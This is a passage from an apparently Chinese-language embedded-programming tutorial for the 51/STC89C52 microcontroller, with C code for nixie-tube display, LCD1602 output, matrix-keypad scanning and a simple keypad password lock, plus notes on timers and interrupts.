data i, j;</span><br><span class="line"><span class="keyword">while</span>(xms--)</span><br><span class="line">&#123;</span><br><span class="line">i = <span class="number">2</span>;</span><br><span class="line">j = <span class="number">239</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (--j);</span><br><span class="line">&#125; <span class="keyword">while</span> (--i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Nixie</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> Location,Number)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span>(Location)<span class="comment">//位选</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>: P2_4=<span class="number">1</span>;P2_3=<span class="number">1</span>;P2_2=<span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>: P2_4=<span class="number">1</span>;P2_3=<span class="number">1</span>;P2_2=<span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>: P2_4=<span class="number">1</span>;P2_3=<span class="number">0</span>;P2_2=<span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>: P2_4=<span class="number">1</span>;P2_3=<span class="number">0</span>;P2_2=<span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>: P2_4=<span class="number">0</span>;P2_3=<span class="number">1</span>;P2_2=<span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>: P2_4=<span class="number">0</span>;P2_3=<span class="number">1</span>;P2_2=<span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>: P2_4=<span class="number">0</span>;P2_3=<span class="number">0</span>;P2_2=<span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">8</span>: P2_4=<span class="number">0</span>;P2_3=<span class="number">0</span>;P2_2=<span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">P0=NixieTable[Number];<span class="comment">//传送段选数据</span></span><br><span class="line">Delay(<span class="number">1</span>);<span class="comment">//延时一段时间，等待显示稳定</span></span><br><span class="line">P0=<span class="number">0x00</span>;;<span class="comment">//消音</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">Nixie(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">Nixie(<span class="number">2</span>,<span class="number">1</span>);</span><br><span class="line">Nixie(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">Nixie(<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">Nixie(<span class="number">5</span>,<span class="number">1</span>);</span><br><span class="line">Nixie(<span class="number">6</span>,<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>单片机直接扫描：硬件设备简单，但会耗费大量的单片机CPU时间</li><li>专用驱动芯片：内部自带显存、扫描电路，单片机只需告诉它显示什么即可</li></ul><h3 id="模块化编程"><a href="#模块化编程" class="headerlink" title="模块化编程"></a>模块化编程</h3><ul><li><p>.c文件：函数、变量的定义</p></li><li><p>.h文件：可被外部调用的函数、变量的声明</p></li><li><p>任何自定义的变量、函数在调用前必须有定义或声明（同一个.c）</p></li><li><p>使用到的自定义函数的.c文件必须添加到工程参与编译</p></li><li><p>使用到的.h文件必须要放在编译器可寻找到的地方（工程文件夹根目录、安装目录、自定义）</p></li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240206182338861.png" alt="image-20240206182338861"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*Delay.h*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __DELAY_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __DELAY_H__</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Delay</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> xms)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">/*Delay.h*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*Delay.c*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Delay</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> xms)</span> <span class="comment">//delay</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> data i, j;</span><br><span class="line"><span class="keyword">while</span>(xms--)</span><br><span class="line">&#123;</span><br><span class="line">i = <span class="number">2</span>;</span><br><span class="line">j = <span class="number">239</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (--j);</span><br><span class="line">&#125; <span class="keyword">while</span> (--i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*Delay.c*/</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*Nixie.h*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __Nixie_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __Nixie_H__</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Nixie</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> Location,Number)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">/*Nixie.h*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*Nixie.c*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;REGX52.H&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Delay.h&quot;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> NixieTable[]=&#123;<span class="number">0x3F</span>,<span class="number">0x06</span>,<span class="number">0x5B</span>,<span class="number">0x4F</span>,<span class="number">0x66</span>,<span class="number">0x6D</span>,<span class="number">0x7D</span>,<span class="number">0x07</span>,<span class="number">0x7F</span>,<span class="number">0x6F</span>,<span class="number">0x77</span>,<span class="number">0x7C</span>,<span class="number">0x39</span>,<span class="number">0x5E</span>,<span class="number">0x79</span>,<span class="number">0x71</span>,<span class="number">0x00</span>&#125;;<span class="comment">//段码数据</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Nixie</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> Location,Number)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span>(Location)<span class="comment">//位选</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>: P2_4=<span class="number">1</span>;P2_3=<span class="number">1</span>;P2_2=<span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>: P2_4=<span class="number">1</span>;P2_3=<span class="number">1</span>;P2_2=<span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>: P2_4=<span class="number">1</span>;P2_3=<span class="number">0</span>;P2_2=<span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>: P2_4=<span class="number">1</span>;P2_3=<span class="number">0</span>;P2_2=<span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>: P2_4=<span class="number">0</span>;P2_3=<span class="number">1</span>;P2_2=<span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>: P2_4=<span class="number">0</span>;P2_3=<span class="number">1</span>;P2_2=<span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>: P2_4=<span class="number">0</span>;P2_3=<span class="number">0</span>;P2_2=<span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">8</span>: P2_4=<span class="number">0</span>;P2_3=<span class="number">0</span>;P2_2=<span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">P0=NixieTable[Number];<span class="comment">//传送段选数据</span></span><br><span class="line">Delay(<span class="number">1</span>);<span class="comment">//延时一段时间，等待显示稳定</span></span><br><span class="line">P0=<span class="number">0x00</span>;;<span class="comment">//消音</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Nixie.c*/</span></span><br></pre></td></tr></table></figure><h3 id="LCD1602-液晶屏"><a href="#LCD1602-液晶屏" class="headerlink" title="LCD1602 液晶屏"></a>LCD1602 液晶屏</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240206185924491.png" alt="image-20240206185924491"></p><ul><li>LCD1602可以作为调试窗口</li></ul><div class="table-container"><table><thead><tr><th><strong>函数</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>LCD_Init();</td><td>初始化</td></tr><tr><td>LCD_ShowChar(1,1,’A’);</td><td>显示一个字符</td></tr><tr><td>LCD_ShowString(1,3,”Hello”);</td><td>显示字符串</td></tr><tr><td>LCD_ShowNum(1,9,123,3);</td><td>显示十进制数字</td></tr><tr><td>LCD_ShowSignedNum(1,13,-66,2);</td><td>显示有符号十进制数字</td></tr><tr><td>LCD_ShowHexNum(2,1,0xA8,2);</td><td>显示十六进制数字</td></tr><tr><td>LCD_ShowBinNum(2,4,0xAA,8);</td><td>显示二进制数字</td></tr></tbody></table></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;REGX52.H&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Delay.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;lcd1602.h&quot;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line">LCD_Init();</span><br><span class="line">LCD_ShowChar(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">LCD_ShowString(<span class="number">1</span>,<span class="number">3</span>,<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">LCD_ShowSignedNum(<span class="number">1</span>,<span class="number">13</span>,<span class="number">-66</span>,<span class="number">2</span>);</span><br><span class="line">LCD_ShowHexNum(<span class="number">2</span>,<span class="number">1</span>,<span class="number">0xA8</span>,<span class="number">2</span>);</span><br><span class="line">LCD_ShowBinNum(<span class="number">2</span>,<span class="number">4</span>,<span class="number">0xAA</span>,<span class="number">8</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">result++;</span><br><span class="line">Delay(<span class="number">1000</span>);</span><br><span class="line">LCD_ShowNum(<span class="number">1</span>,<span class="number">9</span>,result,<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="矩阵键盘"><a href="#矩阵键盘" class="headerlink" title="矩阵键盘"></a>矩阵键盘</h3><ul><li><p>在键盘中按键数量较多时，为了减少I/O口的占用，通常将按键排列成矩阵形式</p></li><li><p>采用逐行或逐列的“扫描”，就可以读出任何位置按键的状态</p></li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240206195612287.png" alt="image-20240206195612287"></p><h4 id="扫描的概念"><a href="#扫描的概念" class="headerlink" title="扫描的概念"></a>扫描的概念</h4><ul><li><p>数码管扫描（输出扫描）</p><p> 原理：显示第1位→显示第2位→显示第3位→……，然后快速循环这个过程，最终实现所有数码管同时显示的效果</p></li></ul><ul><li><p>矩阵键盘扫描（输入扫描）</p><p>原理：读取第1行(列)→读取第2行(列) →读取第3行(列) → ……，然后快速循环这个过程，最终实现所有按键被同时检测的假象</p></li><li><p>以上两种扫描方式的共性：节省I/O口</p></li></ul><p>采用逐行扫描,这里就直接copy了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*MatrixKey.c*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;REGX52.H&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Delay.h&quot;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">MatrixKey</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> KeyNumber=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">P1=<span class="number">0xFF</span>;</span><br><span class="line">P1_3=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(P1_7==<span class="number">0</span>)&#123;Delay(<span class="number">20</span>);<span class="keyword">while</span>(P1_7==<span class="number">0</span>);Delay(<span class="number">20</span>);KeyNumber=<span class="number">1</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>(P1_6==<span class="number">0</span>)&#123;Delay(<span class="number">20</span>);<span class="keyword">while</span>(P1_6==<span class="number">0</span>);Delay(<span class="number">20</span>);KeyNumber=<span class="number">5</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>(P1_5==<span class="number">0</span>)&#123;Delay(<span class="number">20</span>);<span class="keyword">while</span>(P1_5==<span class="number">0</span>);Delay(<span class="number">20</span>);KeyNumber=<span class="number">9</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>(P1_4==<span class="number">0</span>)&#123;Delay(<span class="number">20</span>);<span class="keyword">while</span>(P1_4==<span class="number">0</span>);Delay(<span class="number">20</span>);KeyNumber=<span class="number">13</span>;&#125;</span><br><span class="line"></span><br><span class="line">P1=<span class="number">0xFF</span>;</span><br><span class="line">P1_2=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(P1_7==<span class="number">0</span>)&#123;Delay(<span class="number">20</span>);<span class="keyword">while</span>(P1_7==<span class="number">0</span>);Delay(<span class="number">20</span>);KeyNumber=<span class="number">2</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>(P1_6==<span class="number">0</span>)&#123;Delay(<span class="number">20</span>);<span class="keyword">while</span>(P1_6==<span class="number">0</span>);Delay(<span class="number">20</span>);KeyNumber=<span class="number">6</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>(P1_5==<span class="number">0</span>)&#123;Delay(<span class="number">20</span>);<span class="keyword">while</span>(P1_5==<span class="number">0</span>);Delay(<span class="number">20</span>);KeyNumber=<span class="number">10</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>(P1_4==<span class="number">0</span>)&#123;Delay(<span class="number">20</span>);<span class="keyword">while</span>(P1_4==<span class="number">0</span>);Delay(<span class="number">20</span>);KeyNumber=<span class="number">14</span>;&#125;</span><br><span class="line"></span><br><span class="line">P1=<span class="number">0xFF</span>;</span><br><span class="line">P1_1=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(P1_7==<span class="number">0</span>)&#123;Delay(<span class="number">20</span>);<span class="keyword">while</span>(P1_7==<span class="number">0</span>);Delay(<span class="number">20</span>);KeyNumber=<span class="number">3</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>(P1_6==<span class="number">0</span>)&#123;Delay(<span class="number">20</span>);<span class="keyword">while</span>(P1_6==<span class="number">0</span>);Delay(<span class="number">20</span>);KeyNumber=<span class="number">7</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>(P1_5==<span class="number">0</span>)&#123;Delay(<span class="number">20</span>);<span class="keyword">while</span>(P1_5==<span class="number">0</span>);Delay(<span class="number">20</span>);KeyNumber=<span class="number">11</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>(P1_4==<span class="number">0</span>)&#123;Delay(<span class="number">20</span>);<span class="keyword">while</span>(P1_4==<span class="number">0</span>);Delay(<span class="number">20</span>);KeyNumber=<span class="number">15</span>;&#125;</span><br><span class="line"></span><br><span class="line">P1=<span class="number">0xFF</span>;</span><br><span class="line">P1_0=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(P1_7==<span class="number">0</span>)&#123;Delay(<span class="number">20</span>);<span class="keyword">while</span>(P1_7==<span class="number">0</span>);Delay(<span class="number">20</span>);KeyNumber=<span class="number">4</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>(P1_6==<span class="number">0</span>)&#123;Delay(<span class="number">20</span>);<span class="keyword">while</span>(P1_6==<span class="number">0</span>);Delay(<span class="number">20</span>);KeyNumber=<span class="number">8</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>(P1_5==<span class="number">0</span>)&#123;Delay(<span class="number">20</span>);<span class="keyword">while</span>(P1_5==<span class="number">0</span>);Delay(<span class="number">20</span>);KeyNumber=<span class="number">12</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>(P1_4==<span class="number">0</span>)&#123;Delay(<span class="number">20</span>);<span class="keyword">while</span>(P1_4==<span class="number">0</span>);Delay(<span class="number">20</span>);KeyNumber=<span class="number">16</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> KeyNumber;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*MatrixKey.c*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*MatrixKey.h*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __MATRIXKEY_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __MATRIXKEY_H__</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">MatrixKey</span><span class="params">()</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">/*MatrixKey.h*/</span></span><br></pre></td></tr></table></figure><h3 id="矩阵键盘密码锁-8位"><a href="#矩阵键盘密码锁-8位" class="headerlink" title="矩阵键盘密码锁(8位)"></a>矩阵键盘密码锁(8位)</h3><p>由于我们最大定义int整型，因此要采用两个password实现。然后每四位显示相隔，可以采用LCD_ShowChar()解决</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;REGX52.H&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Delay.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;LCD1602.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;MatrixKey.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> KeyNum;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> Password1,Password2,Count;</span><br><span class="line"></span><br><span class="line">LCD_Init();</span><br><span class="line">LCD_ShowString(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&quot;PASSWORD:&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">KeyNum=MatrixKey();</span><br><span class="line"><span class="keyword">if</span>(KeyNum)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(KeyNum&lt;=<span class="number">10</span>)   <span class="comment">//输入密码</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(Count&lt;<span class="number">4</span>)<span class="comment">//password1</span></span><br><span class="line">&#123;</span><br><span class="line">Password1*=<span class="number">10</span>;</span><br><span class="line">Password1+=KeyNum%<span class="number">10</span>;</span><br><span class="line">Count++;</span><br><span class="line">&#125;</span><br><span class="line">LCD_ShowNum(<span class="number">2</span>,<span class="number">1</span>,Password1,<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(Count&gt;<span class="number">4</span>&amp;&amp;Count&lt;=<span class="number">8</span>)<span class="comment">//password2</span></span><br><span class="line">&#123;</span><br><span class="line">Password2*=<span class="number">10</span>;</span><br><span class="line">Password2+=KeyNum%<span class="number">10</span>;</span><br><span class="line">Count++;</span><br><span class="line">&#125;</span><br><span class="line">LCD_ShowNum(<span class="number">2</span>,<span class="number">5</span>,Password2,<span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span>(Count==<span class="number">4</span>)</span><br><span class="line">Count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(KeyNum==<span class="number">11</span>)<span class="comment">//确认按钮</span></span><br><span class="line">&#123;<span class="keyword">if</span>(Password1==<span class="number">1234</span>&amp;&amp;Password2==<span class="number">5678</span>)</span><br><span class="line">&#123;</span><br><span class="line">LCD_ShowString(<span class="number">1</span>,<span class="number">14</span>,<span class="string">&quot;OK &quot;</span>);</span><br><span class="line">Password1=<span class="number">0</span>;</span><br><span class="line">Password2=<span class="number">0</span>;</span><br><span class="line">Count=<span class="number">0</span>;</span><br><span class="line">LCD_ShowNum(<span class="number">2</span>,<span class="number">1</span>,Password1,<span class="number">4</span>);</span><br><span class="line">LCD_ShowNum(<span class="number">2</span>,<span class="number">5</span>,Password2,<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">LCD_ShowString(<span class="number">1</span>,<span class="number">14</span>,<span class="string">&quot;ERR&quot;</span>);</span><br><span class="line">Password1=<span class="number">0</span>;</span><br><span class="line">Password2=<span class="number">0</span>;</span><br><span class="line">Count=<span class="number">0</span>;</span><br><span class="line">LCD_ShowNum(<span class="number">2</span>,<span class="number">1</span>,Password1,<span class="number">4</span>);</span><br><span class="line">LCD_ShowNum(<span class="number">2</span>,<span class="number">5</span>,Password2,<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(KeyNum==<span class="number">12</span>)<span class="comment">//重置按钮</span></span><br><span class="line">&#123;</span><br><span class="line">Password1=<span class="number">0</span>;</span><br><span class="line">Password2=<span class="number">0</span>;</span><br><span class="line">Count=<span class="number">0</span>;</span><br><span class="line">LCD_ShowNum(<span class="number">2</span>,<span class="number">1</span>,Password1,<span class="number">4</span>);</span><br><span class="line">LCD_ShowNum(<span class="number">2</span>,<span class="number">5</span>,Password2,<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="定时器"><a href="#定时器" class="headerlink" title="定时器"></a>定时器</h3><ul><li>定时器介绍：51单片机的定时器属于单片机的内部资源，其电路的连接和运转均在单片机内部完成。</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240206230629247.png" alt="image-20240206230629247"></p><ul><li>定时器个数2个（T0、T1、T2），不同单片机个数不同。</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240206232058529.png" alt="image-20240206232058529"></p><ul><li>SYSclk：系统时钟，即晶振周期，本开发板上的晶振为12MHz</li></ul><h4 id="CPU-时序的有关知识"><a href="#CPU-时序的有关知识" class="headerlink" title="CPU 时序的有关知识"></a>CPU 时序的有关知识</h4><ul><li>在计算机体系结构和微处理器设计中，有几个与时间周期相关的概念，它们是：<ul><li><strong>振荡周期</strong>（Oscillation Cycle）：<ul><li>振荡周期也称为时钟周期，是指时钟振荡器产生的一个完整的周期的时间。它是处理器内部操作的基本时间单位。</li></ul></li><li><strong>状态周期</strong>（State Cycle）：<ul><li>状态周期是处理器内部操作的一个更细分的时序单位。</li></ul></li><li><strong>机器周期</strong>（Machine Cycle）：<ul><li>机器周期是执行一个基本机器指令所需的时间。</li></ul></li><li><strong>指令周期</strong>（Instruction Cycle）：<ul><li>指令周期是处理器从取指令到执行完该指令所需的全部时间。</li></ul></li></ul></li><li>例如：外接晶振为 12MHz 时，51 单片机相关周期的具体值为：<br>振荡周期=1/12us;<br>状态周期=1/6us;<br>机器周期=1us;<br>指令周期=1~4us;</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240206231726875.png" alt="image-20240206231726875"></p><h4 id="中断系统"><a href="#中断系统" class="headerlink" title="中断系统"></a>中断系统</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240206233034271.png" alt="image-20240206233034271"></p><ul><li>STC89C52中断资源</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240206233407160.png" alt="image-20240206233407160"></p><figure class="highlight c"><table><tr><td 